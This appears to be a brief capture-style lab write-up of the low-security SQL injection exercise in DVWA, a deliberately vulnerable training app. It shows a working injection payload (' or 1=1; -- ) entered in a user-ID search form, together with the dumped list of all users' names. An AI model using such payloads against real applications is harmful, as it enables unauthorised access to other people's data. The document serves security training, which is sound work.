<!--TODO add metadata-->
# Security Level - Low
We see a form which searches for users using their ID

![form](../../../public/images/DVWA/sql_injection/form.png)

Using a normal id, eg: 1, return a single user
```bash
ID: 1
First name: admin
Surname: admin
```

Using a basic sql injection payload (1=1 creates an always-true condition) we can retrieve everyone's data
```bash
' or 1=1; -- -- 
```
```bash
ID: ' or 1=1; -- -- 
First name: admin
Surname: admin

ID: ' or 1=1; -- -- 
First name: Gordon
Surname: Brown

ID: ' or 1=1; -- -- 
First name: Hack
Surname: Me

ID: ' or 1=1; -- -- 
First name: Pablo
Surname: Picasso

ID: ' or 1=1; -- -- 
First name: Bob
Surname: Smith
```


